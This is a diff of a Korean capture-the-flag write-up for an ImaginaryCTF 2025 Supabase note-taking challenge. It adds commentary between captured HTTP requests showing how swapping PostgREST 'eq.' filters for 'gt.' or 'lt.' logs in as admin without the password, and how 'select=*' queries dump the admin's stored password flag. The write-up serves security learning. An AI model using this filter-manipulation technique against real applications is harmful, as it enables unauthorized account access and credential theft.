@@ -10,12 +10,14 @@
 ## Brief Description
 I made a new note taking app using Supabase! Its so secure, I put my flag as the password to the "admin" account. I even put my anonymous key somewhere in the site. The password database is called, "users". http://imaginary-notes.chal.imaginaryctf.org
 ## Initial Analysis
-### Environment
-## Vulnerability
-## Exploit
-### Strategy
-### Exploitation Steps
-### PoC(Poof of Concept)
+### Login
+![](./../../Resources/images/2025-Imaginary-imaginary-notes1.png "로그인 페이지")
+### Add Notes
+![](./../../Resources/images/2025-Imaginary-imaginary-notes2.png "Add Notes 페이지")
+![](./../../Resources/images/2025-Imaginary-imaginary-notes3.png "입력1")
+![](./../../Resources/images/2025-Imaginary-imaginary-notes4.png "입력2")
+Burp Suite로 확인한 결과 서버와 아무런 상호작용(Request, Response)이 없었다.  
+## PoC(Poof of Concept)
 ### eq.yerin eq.1234
 ``` http
 GET /rest/v1/users?select=*&username=eq.yerin&password=eq.1234 HTTP/2
@@ -64,6 +66,7 @@ Alt-Svc: h3=":443"; ma=86400
 
 {"id":"331f5dab-606d-49da-9b6b-d448260b43d0","username":"yerin","password":"1234"}
 ```
+계정을 생성하고 로그인을 시도한 결과 `username`과 `password` 앞에 `eq.`이 붙는 것을 확인할 수 있었다.  
 ### yerin 1234
 ``` http
 GET /rest/v1/users?select=*&username=yerin&password=1234 HTTP/2
@@ -109,6 +112,12 @@ Alt-Svc: h3=":443"; ma=86400
 
 {"code":"PGRST100","details":"unexpected \"y\" expecting \"not\" or operator (eq, gt, ...)","hint":null,"message":"\"failed to parse filter (yerin)\" (line 1, column 1)"}
 ```
+`eq.`를 제거하고 로그인 요청을 다시 시도한 결과 코드 `400`이 응답으로 돌아왔다.  
+응답 내용을 살펴보면 서버는 `username`과 `password` 앞에 `operator (eq, gt, ...)`가 붙어서 오는 것을 기대하는 것을 확인할 수 있었다. 또한 각 연산의 의미는 다음으로 추정해볼 수 있다.  
+| operator | 설명 |
+| --- | --- |
+| eq | eqaul |
+| gt | greater |
 ### eq.yerin gt.1233
 ``` http
 GET /rest/v1/users?select=*&username=eq.yerin&password=gt.1233 HTTP/2
@@ -157,6 +166,8 @@ Alt-Svc: h3=":443"; ma=86400
 
 {"id":"331f5dab-606d-49da-9b6b-d448260b43d0","username":"yerin","password":"1234"}
 ```
+`password`보다 사전순으로 앞에 오는 값에 `gt.` 연산을 추가한 후 로그인 요청을 보낸 결과 예상한대로 로그인에 성공했다.  
+추가로 쿼리 결과가 2개 이상인 경우에는 로그인을 실패하게 된다.  
 ### eq.yerin lt.1235
 ``` http
 GET /rest/v1/users?select=*&username=eq.yerin&password=lt.1235 HTTP/2
@@ -205,6 +216,7 @@ Alt-Svc: h3=":443"; ma=86400
 
 {"id":"331f5dab-606d-49da-9b6b-d448260b43d0","username":"yerin","password":"1234"}
 ```
+호기심에 `lt.`도 시도해본 결과 이 역시 로그인에 성공할 수 있었다.  
 ### eq.admin gt.0
 ``` http
 GET /rest/v1/users?select=*&username=eq.admin&password=gt.0 HTTP/2
@@ -252,6 +264,8 @@ Alt-Svc: h3=":443"; ma=86400
 
 {"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}
 ```
+`admin` 계정은 단 한 개만 존재하기 때문에, 사전순으로 가장 앞에오는 `'0'`에 `gt.` 연산을 추가하여 로그인을 시도한 결과 `admin` 계정으로 로그인에 성공할 수 있었다.  
+## PoC(Poof of Concept) 2
 ### id eq.yerin
 ``` http
 GET /rest/v1/users?select=id&username=eq.yerin HTTP/2
@@ -300,6 +314,7 @@ Alt-Svc: h3=":443"; ma=86400
 
 [{"id":"331f5dab-606d-49da-9b6b-d448260b43d0"}]
 ```
+계정 생성을 통해서도 동일하게 FLAG를 획득할 수 있다. 계정 생성 요청 시 `users` 테이블에서 `name`이 동일한 계정이 있다면 `id`를 반환한다.  
 ### password eq.yerin
 ``` http
 GET /rest/v1/users?select=password&username=eq.yerin HTTP/2
@@ -348,54 +363,7 @@ Alt-Svc: h3=":443"; ma=86400
 
 [{"password":"1234"}]
 ```
-### id eq.admin
-``` http
-GET /rest/v1/users?select=id&username=eq.admin HTTP/2
-Host: dpyxnwiuwzahkxuxrojp.supabase.co
-Sec-Ch-Ua-Platform: "Windows"
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
-Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
-Sec-Ch-Ua-Mobile: ?0
-X-Client-Info: supabase-js-web/2.50.3
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
-Accept: application/json
-Accept-Profile: public
-Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
-Origin: http://imaginary-notes.chal.imaginaryctf.org
-Sec-Fetch-Site: cross-site
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://imaginary-notes.chal.imaginaryctf.org/
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7
-Priority: u=1, i
-```
-``` http
-HTTP/2 200 OK
-Date: Sat, 06 Sep 2025 11:46:39 GMT
-Content-Type: application/json; charset=utf-8
-Content-Length: 47
-Content-Range: 0-0/*
-Cf-Ray: 97adba222eb2a7bd-ICN
-Cf-Cache-Status: DYNAMIC
-Access-Control-Allow-Origin: http://imaginary-notes.chal.imaginaryctf.org
-Content-Location: /users?select=id&username=eq.admin
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-Access-Control-Expose-Headers: Content-Encoding, Content-Location, Content-Range, Content-Type, Date, Location, Server, Transfer-Encoding, Range-Unit
-Content-Profile: public
-Sb-Gateway-Version: 1
-Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
-Sb-Request-Id: 01991ed9-9169-7087-8fc5-0756cae9dbc0
-X-Content-Type-Options: nosniff
-X-Envoy-Attempt-Count: 1
-X-Envoy-Upstream-Service-Time: 17
-Set-Cookie: __cf_bm=2fDBPtPATt93SThhHr4Ly2G77tG574rWBT2ZcJrNxNQ-1757159199-1.0.1.1-IOlKQZz7W0bN.0yvOrMBI5DyjmCfRsNawXyAnHBWwx3LriyR0UbnDZaaAojqisXDmJrU9yUodaAnz_5ojr5EdR.NOFiPQWmAxU4uOnYp5Vg; path=/; expires=Sat, 06-Sep-25 12:16:39 GMT; domain=.supabase.co; HttpOnly; Secure; SameSite=None
-Vary: Accept-Encoding
-Server: cloudflare
-Alt-Svc: h3=":443"; ma=86400
-
-[{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9"}]
-```
+`id`를 `password`로 수정 후 계정 생성 요청을 보낸 결과 `password`도 반환하는 것을 확인할 수 있었다.  
 ### * eq.admin
 ``` http
 GET /rest/v1/users?select=*&username=eq.admin HTTP/2
@@ -443,4 +411,4 @@ Alt-Svc: h3=":443"; ma=86400
 
 [{"id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9","username":"admin","password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}]
 ```
-![](./../../Resources/images/2025-Imaginary-imaginary-notes1.png "로그인 화면")
+`admin`의 모든 정보를 반환하도록 `*`로 수정 후 계정 생성 요청 결과 FLAG를 획득할 수 있었다.  
